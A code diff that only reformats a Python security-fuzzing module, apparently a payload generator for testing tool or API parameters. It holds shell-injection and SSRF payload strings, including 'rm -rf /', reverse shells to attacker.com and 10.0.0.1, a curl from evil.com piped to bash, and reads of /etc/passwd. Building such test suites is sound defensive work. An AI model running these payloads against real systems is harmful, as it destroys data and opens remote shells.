@@ -35,16 +35,33 @@ class Payload:
 
 def generate_shell_injection() -> list[Payload]:
     return [
-        Payload("; rm -rf /", "shell-injection", Severity.CRITICAL, "Semicolon command separator"),
-        Payload("$(whoami)", "shell-injection", Severity.CRITICAL, "Command substitution"),
-        Payload("`cat /etc/passwd`", "shell-injection", Severity.CRITICAL, "Backtick execution"),
+        Payload(
+            "; rm -rf /",
+            "shell-injection",
+            Severity.CRITICAL,
+            "Semicolon command separator",
+        ),
+        Payload(
+            "$(whoami)", "shell-injection", Severity.CRITICAL, "Command substitution"
+        ),
+        Payload(
+            "`cat /etc/passwd`",
+            "shell-injection",
+            Severity.CRITICAL,
+            "Backtick execution",
+        ),
         Payload(
             "| nc -e /bin/sh attacker.com 4444",
             "shell-injection",
             Severity.CRITICAL,
             "Pipe to reverse shell",
         ),
-        Payload("& del /f /q C:\\*", "shell-injection", Severity.HIGH, "Windows command chaining"),
+        Payload(
+            "& del /f /q C:\\*",
+            "shell-injection",
+            Severity.HIGH,
+            "Windows command chaining",
+        ),
         Payload(
             "\n/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
             "shell-injection",
@@ -52,7 +69,10 @@ def generate_shell_injection() -> list[Payload]:
             "Newline bash reverse shell",
         ),
         Payload(
-            "'; DROP TABLE users;--", "shell-injection", Severity.HIGH, "SQL injection via shell"
+            "'; DROP TABLE users;--",
+            "shell-injection",
+            Severity.HIGH,
+            "SQL injection via shell",
         ),
         Payload(
             "${IFS}curl${IFS}http://evil.com/shell.sh|bash",
@@ -79,10 +99,22 @@ def generate_ssrf() -> list[Payload]:
         ),
         Payload("http://localhost:22", "ssrf", Severity.HIGH, "SSH port probe"),
         Payload("http://127.0.0.1:6379/", "ssrf", Severity.HIGH, "Redis default port"),
-        Payload("file:///etc/passwd", "ssrf", Severity.CRITICAL, "Local file read via file://"),
-        Payload("http://[::1]:8080/admin", "ssrf", Severity.HIGH, "IPv6 localhost bypass"),
+        Payload(
+            "file:///etc/passwd",
+            "ssrf",
+            Severity.CRITICAL,
+            "Local file read via file://",
+        ),
+        Payload(
+            "http://[::1]:8080/admin", "ssrf", Severity.HIGH, "IPv6 localhost bypass"
+        ),
         Payload("http://0x7f000001/", "ssrf", Severity.MEDIUM, "Hex-encoded localhost"),
-        Payload("dict://127.0.0.1:6379/INFO", "ssrf", Severity.HIGH, "Redis via dict:// protocol"),
+        Payload(
+            "dict://127.0.0.1:6379/INFO",
+            "ssrf",
+            Severity.HIGH,
+            "Redis via dict:// protocol",
+        ),
     ]
 
 
@@ -114,10 +146,16 @@ def generate_type_confusion(param_type: str = "string") -> list[Payload]:
         payloads.extend(
             [
                 Payload(
-                    ["array", "value"], "type-confusion", Severity.HIGH, "Array for string param"
+                    ["array", "value"],
+                    "type-confusion",
+                    Severity.HIGH,
+                    "Array for string param",
                 ),
                 Payload(
-                    {"nested": "object"}, "type-confusion", Severity.HIGH, "Object for string param"
+                    {"nested": "object"},
+                    "type-confusion",
+                    Severity.HIGH,
+                    "Object for string param",
                 ),
             ]
         )
@@ -125,9 +163,17 @@ def generate_type_confusion(param_type: str = "string") -> list[Payload]:
         payloads.extend(
             [
                 Payload(
-                    "not_a_number", "type-confusion", Severity.HIGH, "String for integer param"
+                    "not_a_number",
+                    "type-confusion",
+                    Severity.HIGH,
+                    "String for integer param",
                 ),
-                Payload([1, 2, 3], "type-confusion", Severity.MEDIUM, "Array for integer param"),
+                Payload(
+                    [1, 2, 3],
+                    "type-confusion",
+                    Severity.MEDIUM,
+                    "Array for integer param",
+                ),
             ]
         )
     return payloads
@@ -217,7 +263,9 @@ def generate_indirect_injection() -> list[Payload]:
     ]
 
 
-def generate_all_for_param(param_name: str, param_schema: dict[str, Any]) -> list[Payload]:
+def generate_all_for_param(
+    param_name: str, param_schema: dict[str, Any]
+) -> list[Payload]:
     """Generate targeted payloads based on parameter type."""
     ptype = param_schema.get("type", "string").lower()
     fmt = param_schema.get("format", "").lower()
